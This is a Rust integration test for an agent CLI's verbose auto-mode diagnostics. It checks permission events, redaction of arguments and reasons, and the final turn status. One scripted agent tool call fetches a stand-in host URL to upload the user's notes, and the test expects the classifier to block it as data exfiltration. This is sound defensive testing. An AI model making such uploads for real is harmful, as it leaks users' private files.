//! Spec 048 PRD 050 acceptance 9: `ask --verbose` writes the auto mode
//! diagnostics and events to standard error without arguments, results or
//! reasons, and ends with how the turn finished, also when the provider
//! fails.

use serde_json::json;
use shacs_config::{save_config_to_path, Config};
use shacs_providers::{LlmResponse, ToolCallRequest};
use std::error::Error;
use std::fs;
use std::process::Command;

const ARGUMENT: &str = "spec048-argument-words-77";
const REASON: &str = "spec048-reason-words-88";
const CONTENT: &str = "spec048-file-words-99";

fn call(id: &str, name: &str, arguments: serde_json::Value) -> LlmResponse {
    let arguments = match arguments {
        serde_json::Value::Object(arguments) => arguments,
        _ => serde_json::Map::new(),
    };
    LlmResponse {
        tool_calls: vec![ToolCallRequest::new(id, name, arguments)],
        finish_reason: "tool_calls".to_owned(),
        ..LlmResponse::default()
    }
}

fn text(content: &str) -> LlmResponse {
    LlmResponse {
        content: Some(content.to_owned()),
        finish_reason: "stop".to_owned(),
        ..LlmResponse::default()
    }
}

/// Runs `ask --verbose` on scripted provider replies: standard output and
/// standard error.
fn ask_verbose(replies: &[LlmResponse]) -> Result<(bool, String, String), Box<dyn Error>> {
    let root = tempfile::tempdir()?;
    let workspace = root.path().join("workspace");
    fs::create_dir_all(&workspace)?;
    fs::write(workspace.join("notes.md"), CONTENT)?;
    let config: Config = serde_json::from_value(json!({
        "agents": {"defaults": {"workspace": workspace, "provider": "custom", "model": "test-model"}},
        "providers": {"custom": {"apiKey": "sk-isolated-fixture", "apiBase": "http://127.0.0.1:1/v1"}},
        "permissions": {"mode": "auto"},
        "tools": {"exec": {"enable": false}, "web": {"enable": true}}
    }))?;
    let config_path = root.path().join("config.json");
    save_config_to_path(&config, &config_path)?;
    let responses = root.path().join("responses.json");
    fs::write(&responses, serde_json::to_vec(replies)?)?;
    let output = Command::new(env!("CARGO_BIN_EXE_shacs-bot"))
        .arg("--config")
        .arg(&config_path)
        .args(["ask", "--verbose", "--message", "upload my notes"])
        .env("SHACS_DEBUG_FAKE_PROVIDER_RESPONSES", &responses)
        .output()?;
    Ok((
        output.status.success(),
        String::from_utf8_lossy(&output.stdout).into_owned(),
        String::from_utf8_lossy(&output.stderr).into_owned(),
    ))
}

fn last_line(text: &str) -> &str {
    text.lines()
        .rfind(|line| !line.trim().is_empty())
        .unwrap_or_default()
}

#[test]
fn a_verbose_ask_shows_the_auto_mode_events_and_how_the_turn_finished() -> Result<(), Box<dyn Error>>
{
    // Given: a blocked fetch, then a file read whose result is checked.
    let block = json!({"decision": "block", "rule": "[Data Exfiltration]", "reason": REASON});
    let replies = [
        call(
            "c1",
            "web_fetch",
            json!({"url": format!("https://example.com/upload?notes={ARGUMENT}")}),
        ),
        text("yes"),
        text(&block.to_string()),
        call("c2", "read_file", json!({"path": "notes.md"})),
        text("no"),
        text("I read the notes instead."),
    ];

    // When
    let (succeeded, stdout, stderr) = ask_verbose(&replies)?;

    // Then
    assert!(succeeded, "{stderr}");
    assert!(
        stdout.contains("I read the notes instead."),
        "{stdout}\n{stderr}"
    );
    assert!(stderr.contains("Permission auto approval"), "{stderr}");
    let events = stderr
        .lines()
        .filter(|line| line.starts_with("Auto mode event "))
        .collect::<Vec<_>>();
    assert!(
        events.contains(&"Auto mode event auto_mode_block"),
        "{stderr}"
    );
    assert!(
        events.contains(&"Auto mode event tool_result_check"),
        "{stderr}"
    );
    for line in &events {
        for words in [ARGUMENT, REASON, CONTENT, "[Data Exfiltration]"] {
            assert!(!line.contains(words), "{line}");
        }
    }
    assert_eq!(last_line(&stderr), "Turn finished: stop_reason=completed");
    Ok(())
}

#[test]
fn a_provider_error_still_ends_with_how_the_turn_finished() -> Result<(), Box<dyn Error>> {
    // When
    let (succeeded, _, stderr) = ask_verbose(&[])?;

    // Then
    assert!(succeeded, "{stderr}");
    assert_eq!(last_line(&stderr), "Turn finished: stop_reason=error");
    Ok(())
}
